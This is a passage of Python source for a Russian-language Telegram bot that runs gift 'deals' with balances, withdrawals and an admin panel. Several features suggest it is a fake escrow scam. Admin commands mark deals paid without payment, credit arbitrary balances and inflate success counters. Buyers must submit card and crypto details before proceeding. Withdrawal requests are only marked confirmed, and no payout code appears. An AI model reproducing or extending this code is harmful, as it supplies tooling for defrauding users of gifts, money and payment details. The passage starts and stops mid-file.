    log_action(user_id, "edit_requisites", f"card обновлён")

@dp.message(RequisitesEdit.waiting_stars)
async def process_stars(message: Message, state: FSMContext):
    user_id = message.from_user.id
    value = message.text.strip()
    if not validate_stars(value):
        await message.answer(get_text(user_id, 'requisites_edit_invalid'))
        return
    save_user_requisites(user_id, {'stars': value})
    await state.clear()
    await message.answer(get_text(user_id, 'requisites_edit_success'))
    await asyncio.sleep(0.5)
    await show_requisites(message, user_id)
    log_action(user_id, "edit_requisites", f"stars обновлён")

@dp.message(RequisitesEdit.waiting_usdt)
async def process_usdt(message: Message, state: FSMContext):
    user_id = message.from_user.id
    value = message.text.strip()
    if not validate_usdt(value):
        await message.answer(get_text(user_id, 'requisites_edit_invalid'))
        return
    save_user_requisites(user_id, {'usdt': value})
    await state.clear()
    await message.answer(get_text(user_id, 'requisites_edit_success'))
    await asyncio.sleep(0.5)
    await show_requisites(message, user_id)
    log_action(user_id, "edit_requisites", f"usdt обновлён")

@dp.message(RequisitesEdit.waiting_btc)
async def process_btc(message: Message, state: FSMContext):
    user_id = message.from_user.id
    value = message.text.strip()
    if not validate_btc(value):
        await message.answer(get_text(user_id, 'requisites_edit_invalid'))
        return
    save_user_requisites(user_id, {'btc': value})
    await state.clear()
    await message.answer(get_text(user_id, 'requisites_edit_success'))
    await asyncio.sleep(0.5)
    await show_requisites(message, user_id)
    log_action(user_id, "edit_requisites", f"btc обновлён")

# ---------- Язык ----------
@dp.callback_query(lambda c: c.data == "lang")
async def cb_lang(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    text = get_text(user_id, 'lang_prompt')
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{get_text(user_id, 'lang_ru')}", callback_data="lang_ru"),
         InlineKeyboardButton(text=f"{get_text(user_id, 'lang_en')}", callback_data="lang_en")],
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(callback, text, keyboard)
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("lang_"))
async def cb_lang_set(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    lang_code = callback.data.split("_")[1]
    user_lang[user_id] = lang_code
    await send_main_menu(callback, user_id)
    await callback.answer()
    log_action(user_id, "lang_change", f"язык {lang_code}")

# ---------- Поддержка ----------
@dp.callback_query(lambda c: c.data == "support")
async def cb_support(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    text = get_text(user_id, 'support_contact')
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(callback, text, keyboard)
    await callback.answer()

# ---------- Назад ----------
@dp.callback_query(lambda c: c.data == "back_to_menu")
async def cb_back_to_menu(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    await send_main_menu(callback, user_id)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "create_back")
async def create_back(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    await state.clear()
    await send_main_menu(callback, user_id)
    await callback.answer()

# ---------- Копирование реферальной ссылки ----------
@dp.callback_query(lambda c: c.data == "copy_ref")
async def cb_copy_ref(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    ref_link = get_ref_link(user_id)
    await callback.answer(f"{ref_link}", show_alert=True)
    log_action(user_id, "copy_ref", "копирование реферальной ссылки")

# ---------- Обработчики этапов создания сделки ----------
@dp.callback_query(lambda c: c.data.startswith("role_"))
async def process_role(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    role = callback.data.split("_")[1]
    await state.update_data(role=role)

    if role == 'buyer':
        req = get_user_requisites(user_id)
        if req['ton'] == '—' or req['card'] == '—' or req['usdt'] == '—' or req['btc'] == '—':
            await callback.message.answer("⚠️ Сначала добавьте данные карты в «Мои реквизиты».")
            await show_requisites(callback.message, user_id)
            await state.clear()
            return
        await state.set_state(CreateDealStates.payment_method)
        text = get_text(user_id, 'create_payment')
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Карта", icon_custom_emoji_id=CUSTOM_EMOJI_CARD_BTN, callback_data="pay_card")],
            [InlineKeyboardButton(text="Stars", icon_custom_emoji_id=CUSTOM_EMOJI_STARS_BTN, callback_data="pay_stars")],
            [InlineKeyboardButton(text="Крипта", icon_custom_emoji_id=CUSTOM_EMOJI_USDT, callback_data="pay_crypto")],
            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
        ])
        await send_with_banner(callback, text, keyboard)
    else:  # seller
        await state.set_state(CreateDealStates.currency)
        text = get_text(user_id, 'create_currency')
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="RUB", callback_data="cur_RUB")],
            [InlineKeyboardButton(text="UAH", callback_data="cur_UAH")],
            [InlineKeyboardButton(text="KZT", callback_data="cur_KZT")],
            [InlineKeyboardButton(text="BYN", callback_data="cur_BYN")],
            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
        ])
        await send_with_banner(callback, text, keyboard)
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("pay_"))
async def process_payment(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    method = callback.data.split("_")[1]
    await state.update_data(payment_method=method)

    if method == 'card':
        await state.set_state(CreateDealStates.currency)
        text = get_text(user_id, 'create_currency')
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="RUB", callback_data="cur_RUB")],
            [InlineKeyboardButton(text="UAH", callback_data="cur_UAH")],
            [InlineKeyboardButton(text="KZT", callback_data="cur_KZT")],
            [InlineKeyboardButton(text="BYN", callback_data="cur_BYN")],
            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
        ])
        await send_with_banner(callback, text, keyboard)
    else:
        await state.update_data(currency='USD' if method == 'crypto' else 'Stars')
        await state.set_state(CreateDealStates.amount)
        await ask_amount(callback, user_id, state)
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("cur_"))
async def process_currency(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    await state.set_state(CreateDealStates.amount)
    await ask_amount(callback, user_id, state)
    await callback.answer()

async def ask_amount(target, user_id: int, state: FSMContext):
    data = await state.get_data()
    currency = data.get('currency', 'RUB')
    text = get_text(user_id, 'create_amount').format(currency=currency)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Изменить валюту", icon_custom_emoji_id=CUSTOM_EMOJI_MONEY, callback_data="change_currency")],
        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(target, text, keyboard)

@dp.callback_query(lambda c: c.data == "change_currency")
async def change_currency(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    await state.set_state(CreateDealStates.currency)
    text = get_text(user_id, 'create_currency')
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="RUB", callback_data="cur_RUB")],
        [InlineKeyboardButton(text="UAH", callback_data="cur_UAH")],
        [InlineKeyboardButton(text="KZT", callback_data="cur_KZT")],
        [InlineKeyboardButton(text="BYN", callback_data="cur_BYN")],
        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(callback, text, keyboard)
    await callback.answer()

@dp.message(CreateDealStates.amount)
async def process_amount(message: Message, state: FSMContext):
    user_id = message.from_user.id
    try:
        amount = float(message.text.replace(',', '.'))
    except ValueError:
        await message.answer("Введите число (например, 10.5)")
        return
    await state.update_data(amount=amount)
    await state.set_state(CreateDealStates.description)
    text = get_text(user_id, 'create_description')
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", icon_custom_emoji_id=CUSTOM_EMOJI_GIFT, callback_data="show_gift_desc")],
        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(message, text, keyboard)

@dp.callback_query(lambda c: c.data == "show_gift_desc")
async def show_gift_desc(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    data = await state.get_data()
    description = data.get('description', 'Описание не указано')
    await callback.message.answer(f"Подарок: {description}")
    await callback.answer()

@dp.message(CreateDealStates.description)
async def process_description(message: Message, state: FSMContext):
    user_id = message.from_user.id
    description = message.text
    await state.update_data(description=description)
    data = await state.get_data()
    role = data.get('role')
    code = generate_deal_code()
    link = REF_LINK_TEMPLATE.format(code=code)  # для сделки используется ссылка с кодом
    currency = data.get('currency', 'RUB')
    amount = data.get('amount', 0)
    currency_symbol = currency

    if role == 'seller':
        confirm_text_key = 'create_confirm_seller'
    else:
        confirm_text_key = 'create_confirm_buyer'

    text = get_text(user_id, confirm_text_key).format(
        currency=currency,
        amount=amount,
        currency_symbol=currency_symbol,
        description=description,
        link=link
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", icon_custom_emoji_id=CUSTOM_EMOJI_GIFT, callback_data="show_gift_final")],
        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(message, text, keyboard)

    global_deals[code] = {
        'code': code,
        'status': 'pending',
        'buyer': None,
        'seller': None,
        'creator': user_id,
        'role': role,
        'payment_method': data.get('payment_method'),
        'currency': currency,
        'amount': amount,
        'description': description,
        'created_at': datetime.now().isoformat(),
        'completed': False,
        'paid': False,
        'gift_sent': False,
        'manager_requisites': "Реквизиты менеджера: @Iank (заглушка)"
    }
    await state.clear()
    await state.update_data(deal_code=code)

@dp.callback_query(lambda c: c.data == "show_gift_final")
async def show_gift_final(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    data = await state.get_data()
    code = data.get('deal_code')
    if not code or code not in global_deals:
        await callback.answer("Сделка не найдена", show_alert=True)
        return
    deal = global_deals[code]
    await callback.message.answer(f"Подарок: {deal['description']}")
    await callback.answer()

# ---------- Присоединение к сделке ----------
async def join_deal(message: Message, user_id: int, code: str):
    if code not in global_deals:
        await message.answer("Сделка не найдена или уже завершена.")
        return
    deal = global_deals[code]
    if deal['status'] != 'pending':
        await message.answer("Сделка уже завершена или неактивна.")
        return
    role = deal['role']
    if role == 'seller':
        deal['seller'] = user_id
        deal['status'] = 'active'
    else:
        deal['buyer'] = user_id
        deal['status'] = 'active'

    creator_id = deal['creator']
    await bot.send_message(creator_id, f"К сделке #{code} присоединился {'продавец' if role == 'seller' else 'покупатель'}.")

    if role == 'buyer':
        text = get_text(user_id, 'deal_created_buyer').format(
            code=code,
            buyer_id=user_id,
            buyer_deals=get_user_completed_deals(user_id),
            description=deal['description'],
            currency=deal['currency'],
            amount=deal['amount'],
            manager_requisites=deal.get('manager_requisites', '—')
        )
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", icon_custom_emoji_id=CUSTOM_EMOJI_GIFT, callback_data=f"gift_{code}")],
            [InlineKeyboardButton(text="Отменить сделку", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data=f"cancel_{code}")],
            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
        ])
    else:  # seller
        text = get_text(user_id, 'deal_created_seller').format(
            code=code,
            manager_requisites=deal.get('manager_requisites', '—'),
            seller_deals=get_user_completed_deals(user_id),
            balance=get_user_balance(user_id),
            currency=deal['currency']
        )
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Оплатить с баланса", icon_custom_emoji_id=CUSTOM_EMOJI_WITHDRAW, callback_data=f"pay_{code}")],
            [InlineKeyboardButton(text="Я передал подарок", icon_custom_emoji_id=CUSTOM_EMOJI_GIFT, callback_data=f"gift_sent_{code}")],
            [InlineKeyboardButton(text="Отменить сделку", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data=f"cancel_{code}")],
            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
        ])

    await send_with_banner(message, text, keyboard)
    log_action(user_id, "join_deal", f"код {code}, роль {role}")

# ---------- Действия со сделкой ----------
@dp.callback_query(lambda c: c.data.startswith("gift_"))
async def show_gift_deal(callback: types.CallbackQuery):
    code = callback.data.split("_")[1]
    if code not in global_deals:
        await callback.answer("Сделка не найдена", show_alert=True)
        return
    deal = global_deals[code]
    await callback.message.answer(f"Подарок: {deal['description']}")
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("pay_"))
async def pay_from_balance(callback: types.CallbackQuery):
    code = callback.data.split("_")[1]
    if code not in global_deals:
        await callback.answer("Сделка не найдена", show_alert=True)
        return
    user_id = callback.from_user.id
    deal = global_deals[code]
    amount = deal['amount']
    balance = get_user_balance(user_id)
    if balance < amount:
        await callback.answer(f"Недостаточно средств на балансе. Доступно: {balance} {deal['currency']}", show_alert=True)
        return
    user_balance[user_id] = balance - amount
    frozen_balance[user_id] = frozen_balance.get(user_id, 0.0) + amount
    deal['paid'] = True
    await callback.message.answer(f"Оплата {amount} {deal['currency']} прошла успешно. Средства заморожены до подтверждения сделки.")
    other_side = deal['buyer'] if deal['seller'] == user_id else deal['seller']
    if other_side:
        await bot.send_message(other_side, f"Сделка #{code} оплачена. Ожидайте подтверждения.")
    await callback.answer()
    log_action(user_id, "pay_deal", f"код {code}, сумма {amount}")

@dp.callback_query(lambda c: c.data.startswith("gift_sent_"))
async def gift_sent(callback: types.CallbackQuery):
    code = callback.data.split("_")[2]
    user_id = callback.from_user.id
    if code not in global_deals:
        await callback.answer("Сделка не найдена", show_alert=True)
        return
    deal = global_deals[code]
    if deal.get('gift_sent', False):
        await callback.answer("Вы уже отправили подарок.", show_alert=True)
        return
    deal['gift_sent'] = True
    buyer_id = deal['buyer']
    seller_id = deal['seller']
    if not buyer_id or not seller_id:
        await callback.answer("Ошибка: не хватает участников.", show_alert=True)
        return
    buyer_username = "unknown"
    seller_username = "unknown"
    try:
        buyer_user = await bot.get_chat(buyer_id)
        buyer_username = buyer_user.username or str(buyer_id)
    except:
        pass
    try:
        seller_user = await bot.get_chat(seller_id)
        seller_username = seller_user.username or str(seller_id)
    except:
        pass

    admin_text = get_text(ADMIN_ID, 'gift_sent_admin').format(
        code=code,
        buyer=buyer_username,
        seller=seller_username,
        amount=deal['amount'],
        currency=deal['currency'],
        description=deal['description']
    )
    admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Подтвердить передачу", callback_data=f"confirm_gift_{code}")],
        [InlineKeyboardButton(text="Отправить сообщение продавцу", callback_data=f"reply_seller_{code}")]
    ])
    await bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML", reply_markup=admin_keyboard)
    await callback.message.answer(get_text(user_id, 'gift_sent_seller').format(code=code))
    log_action(user_id, "gift_sent", f"код {code}")
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("confirm_gift_"))
async def confirm_gift(callback: types.CallbackQuery):
    code = callback.data.split("_")[2]
    user_id = callback.from_user.id
    if not is_admin(user_id):
        await callback.answer("Нет доступа", show_alert=True)
        return
    if code not in global_deals:
        await callback.answer("Сделка не найдена", show_alert=True)
        return
    deal = global_deals[code]
    if deal.get('completed', False):
        await callback.answer("Сделка уже завершена", show_alert=True)
        return
    seller_id = deal['seller']
    amount = deal['amount']
    if seller_id:
        frozen_balance[seller_id] = frozen_balance.get(seller_id, 0.0) - amount
        if frozen_balance[seller_id] < 0:
            frozen_balance[seller_id] = 0.0
        user_balance[seller_id] = user_balance.get(seller_id, 0.0) + amount
        user_completed_deals[seller_id] = user_completed_deals.get(seller_id, 0) + 1
    buyer_id = deal['buyer']
    if buyer_id:
        user_completed_deals[buyer_id] = user_completed_deals.get(buyer_id, 0) + 1
    deal['status'] = 'completed'
    deal['completed'] = True
    final_text = get_text(ADMIN_ID, 'gift_confirm_admin').format(code=code)
    await callback.message.answer(final_text, parse_mode="HTML")
    if buyer_id:
        await bot.send_message(buyer_id, get_text(buyer_id, 'gift_confirm_buyer').format(code=code))
    if seller_id:
        await bot.send_message(seller_id, get_text(seller_id, 'deal_completed').format(code=code))
    log_action(user_id, "confirm_gift", f"код {code}")
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("reply_seller_"))
async def reply_seller(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if not is_admin(user_id):
        await callback.answer("Нет доступа", show_alert=True)
        return
    code = callback.data.split("_")[2]
    if code not in global_deals:
        await callback.answer("Сделка не найдена", show_alert=True)
        return
    deal = global_deals[code]
    seller_id = deal['seller']
    if not seller_id:
        await callback.answer("Продавец не найден", show_alert=True)
        return
    await state.update_data(deal_code=code, seller_id=seller_id)
    await state.set_state(AdminReply.waiting_message)
    await callback.message.answer("Введите сообщение для продавца (текст):")
    await callback.answer()

@dp.message(AdminReply.waiting_message)
async def process_admin_reply(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        await state.clear()
        return
    data = await state.get_data()
    code = data.get('deal_code')
    seller_id = data.get('seller_id')
    if not code or not seller_id:
        await message.answer("Ошибка: данные утеряны.")
        await state.clear()
        return
    msg = message.text
    await bot.send_message(seller_id, get_text(seller_id, 'gift_reject_seller').format(message=msg))
    await message.answer(get_text(user_id, 'gift_reject_admin').format(message=msg))
    log_action(user_id, "reply_seller", f"код {code}, сообщение: {msg}")
    await state.clear()

@dp.callback_query(lambda c: c.data.startswith("cancel_"))
async def cancel_deal(callback: types.CallbackQuery):
    code = callback.data.split("_")[1]
    user_id = callback.from_user.id
    if code not in global_deals:
        await callback.answer("Сделка не найдена", show_alert=True)
        return
    deal = global_deals[code]
    if deal['status'] == 'completed':
        await callback.answer("Сделка уже завершена", show_alert=True)
        return
    deal['status'] = 'cancelled'
    if deal.get('paid', False):
        seller_id = deal['seller']
        amount = deal['amount']
        if seller_id:
            frozen_balance[seller_id] = frozen_balance.get(seller_id, 0.0) - amount
            if frozen_balance[seller_id] < 0:
                frozen_balance[seller_id] = 0.0
            user_balance[seller_id] = user_balance.get(seller_id, 0.0) + amount
    await callback.message.answer(get_text(user_id, 'deal_cancelled'))
    other_side = deal['buyer'] if deal['seller'] == user_id else deal['seller']
    if other_side:
        await bot.send_message(other_side, f"Сделка #{code} отменена другой стороной.")
    log_action(user_id, "cancel_deal", f"код {code}")
    await callback.answer()

# ---------- Завершение сделки (админ) ----------
@dp.message(Command("complete_deal"))
async def cmd_complete_deal(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /complete_deal <код>")
        return
    code = args[1]
    if code not in global_deals:
        await message.answer("Сделка не найдена")
        return
    deal = global_deals[code]
    if deal['status'] == 'completed':
        await message.answer("Сделка уже завершена")
        return
    seller_id = deal['seller']
    amount = deal['amount']
    if seller_id:
        frozen_balance[seller_id] = frozen_balance.get(seller_id, 0.0) - amount
        if frozen_balance[seller_id] < 0:
            frozen_balance[seller_id] = 0.0
        user_balance[seller_id] = user_balance.get(seller_id, 0.0) + amount
        user_completed_deals[seller_id] = user_completed_deals.get(seller_id, 0) + 1
    buyer_id = deal['buyer']
    if buyer_id:
        user_completed_deals[buyer_id] = user_completed_deals.get(buyer_id, 0) + 1
    deal['status'] = 'completed'
    deal['completed'] = True
    final_text = get_text(user_id, 'deal_completed').format(code=code)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назад в меню", callback_data="back_to_menu")],
        [InlineKeyboardButton(text="Техподдержка", callback_data="support")]
    ])
    if buyer_id:
        await bot.send_message(buyer_id, final_text, reply_markup=keyboard)
    if seller_id:
        await bot.send_message(seller_id, final_text, reply_markup=keyboard)
    await message.answer(f"Сделка #{code} завершена, уведомления отправлены.")
    log_action(user_id, "complete_deal", f"код {code}")

# ---------- Вывод средств ----------
@dp.callback_query(lambda c: c.data == "withdraw")
async def cb_withdraw(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    completed = get_user_completed_deals(user_id)
    if completed < 2:
        await callback.answer(get_text(user_id, 'withdraw_need'), show_alert=True)
        return
    await callback.message.answer(get_text(user_id, 'withdraw_form_requisites'))
    await state.set_state(WithdrawForm.waiting_requisites)
    await callback.answer()
    log_action(user_id, "withdraw_start", "начало оформления вывода")

@dp.message(WithdrawForm.waiting_requisites)
async def process_requisites(message: Message, state: FSMContext):
    user_id = message.from_user.id
    requisites = message.text
    await state.update_data(requisites=requisites)
    balance = get_user_balance(user_id)
    await message.answer(get_text(user_id, 'withdraw_form_amount').format(amount=balance))
    await state.set_state(WithdrawForm.waiting_amount)

@dp.message(WithdrawForm.waiting_amount)
async def process_amount(message: Message, state: FSMContext):
    user_id = message.from_user.id
    try:
        amount = float(message.text.replace(',', '.'))
    except ValueError:
        await message.answer("Введите число (например, 10.5)")
        return
    balance = get_user_balance(user_id)
    if amount > balance:
        await message.answer(get_text(user_id, 'withdraw_too_much'))
        return
    data = await state.get_data()
    requisites = data['requisites']
    withdraw_requests.append({
        'user_id': user_id,
        'amount': amount,
        'requisites': requisites,
        'status': 'pending'
    })
    await message.answer(get_text(user_id, 'withdraw_success').format(amount=amount))
    await state.clear()
    await send_main_menu(message, user_id)
    log_action(user_id, "withdraw_request", f"сумма {amount} TON, реквизиты {requisites}")

@dp.callback_query(lambda c: c.data == "transactions")
async def cb_transactions(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    text = f"<b>{get_text(user_id, 'transactions_btn')}</b>\n\n{get_text(user_id, 'transactions_empty')}"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(callback, text, keyboard)
    await callback.answer()
    log_action(user_id, "transactions", "просмотр транзакций")

# ============================================================
# АДМИН-КОМАНДЫ
# ============================================================

ADMIN_ID = 8297446667

@dp.message(Command("hyteam"))
async def cmd_hyteam(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    panel_text = (
        f"{EMOJI_SHIELD} <b>Админ-панель</b>\n\n"
        f"<blockquote>\n"
        f"<b>Доступные команды:</b>\n"
        f"• /hyteam — показать эту панель\n"
        f"• /vvteam — заявки на вывод\n"
        f"• /chat [@user или id] [текст] — ответить пользователю\n"
        f"• /hostlebuy [код] — отметить оплату сделки\n"
        f"• /ref [код] — уведомить о проблеме с подарком\n"
        f"• /boost_success [число] — увеличить счётчик успешных сделок\n"
        f"• /giveadmin [@user или id] [время] — выдать админку (1m,1h,1d,1w,1M,1y)\n"
        f"• /addbalance [id] [сумма] — начислить баланс\n"
        f"• /logs — просмотр логов\n"
        f"• /complete_deal [код] — завершить сделку вручную\n"
        f"</blockquote>"
    )
    await send_with_banner(message, panel_text)
    log_action(user_id, "hyteam", "открытие админ-панели")

@dp.message(Command("addbalance"))
async def cmd_addbalance(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    args = message.text.split()
    if len(args) < 3:
        await message.answer(get_text(user_id, 'addbalance_fail'))
        return
    try:
        target_user_id = int(args[1])
        amount = float(args[2].replace(',', '.'))
    except ValueError:
        await message.answer(get_text(user_id, 'addbalance_fail'))
        return
    user_balance[target_user_id] = user_balance.get(target_user_id, 0.0) + amount
    new_balance = user_balance[target_user_id]
    await message.answer(get_text(user_id, 'addbalance_success').format(
        user=target_user_id,
        amount=amount,
        new_balance=new_balance
    ))
    log_action(user_id, "addbalance", f"пользователю {target_user_id} +{amount} TON")

@dp.message(Command("vvteam"))
async def cmd_vvteam(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    if not withdraw_requests:
        await send_with_banner(message, get_text(user_id, 'admin_withdraw_empty'))
        return
    list_text = ""
    buttons = []
    for idx, req in enumerate(withdraw_requests):
        if req['status'] != 'pending':
            continue
        list_text += f"{idx+1}. Пользователь {req['user_id']}, сумма {req['amount']} TON, реквизиты: {req['requisites']}\n"
        buttons.append([InlineKeyboardButton(text=f"Подтвердить #{idx+1}", callback_data=f"confirm_withdraw_{idx}")])
    if not list_text:
        await send_with_banner(message, get_text(user_id, 'admin_withdraw_empty'))
        return
    text = get_text(user_id, 'admin_withdraw_list').format(list=list_text)
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons + [[InlineKeyboardButton(text="Обновить", callback_data="refresh_admin")]])
    await send_with_banner(message, text, keyboard)

@dp.callback_query(lambda c: c.data == "refresh_admin")
async def cb_refresh_admin(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Нет доступа", show_alert=True)
        return
    await cmd_vvteam(callback.message)
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("confirm_withdraw_"))
async def cb_confirm_withdraw(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if not is_admin(user_id):
        await callback.answer("Нет доступа", show_alert=True)
        return
    idx = int(callback.data.split("_")[2])
    if idx >= len(withdraw_requests) or withdraw_requests[idx]['status'] != 'pending':
        await callback.answer("Заявка уже обработана или не существует", show_alert=True)
        return
    req = withdraw_requests[idx]
    req['status'] = 'completed'
    await callback.message.answer(get_text(ADMIN_ID, 'admin_withdraw_confirm').format(amount=req['amount'], user=req['user_id']))
    await callback.answer("Подтверждено")
    await cmd_vvteam(callback.message)
    log_action(user_id, "confirm_withdraw", f"подтверждена заявка {idx+1}")

# ---------- Остальные админ-команды ----------
@dp.message(Command("chat"))
async def cmd_chat(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.answer("Использование: /chat [@user или id] [текст]")
        return
    target_str = args[1]
    text = args[2]
    target_user_id = None
    if target_str.startswith('@'):
        for uid, deals in user_deals.items():
            if deals and deals[0].get('buyer') == target_str[1:]:
                target_user_id = uid
                break
            if deals and deals[0].get('seller') == target_str[1:]:
                target_user_id = uid
                break
    else:
        try:
            target_user_id = int(target_str)
        except:
            pass
    if not target_user_id:
        await message.answer(get_text(user_id, 'chat_no_deal'))
        return
    if target_user_id not in user_deals or not user_deals[target_user_id]:
        await message.answer(get_text(user_id, 'chat_no_deal'))
        return
    try:
        await bot.send_message(target_user_id, f"Сообщение от поддержки:\n{text}")
        await message.answer(get_text(user_id, 'chat_success'))
        log_action(user_id, "chat", f"пользователю {target_user_id}: {text}")
    except Exception as e:
        await message.answer(get_text(user_id, 'chat_fail'))
        logging.error(f"Chat error: {e}")

@dp.message(Command("hostlebuy"))
async def cmd_hostlebuy(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /hostlebuy [код сделки]")
        return
    code = args[1]
    found = False
    for uid, deals in user_deals.items():
        for deal in deals:
            if deal['code'] == code:
                if deal.get('paid'):
                    await message.answer(get_text(user_id, 'hostlebuy_fail'))
                    return
                deal['paid'] = True
                found = True
                break
        if found:
            break
    if found:
        await message.answer(get_text(user_id, 'hostlebuy_success').format(code=code))
        log_action(user_id, "hostlebuy", f"код {code}")
    else:
        await message.answer(get_text(user_id, 'hostlebuy_fail'))

@dp.message(Command("ref"))
async def cmd_ref(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /ref [код сделки]")
        return
    code = args[1]
    found = False
    for uid, deals in user_deals.items():
        for deal in deals:
            if deal['code'] == code:
                found = True
                break
        if found:
            break
    if found:
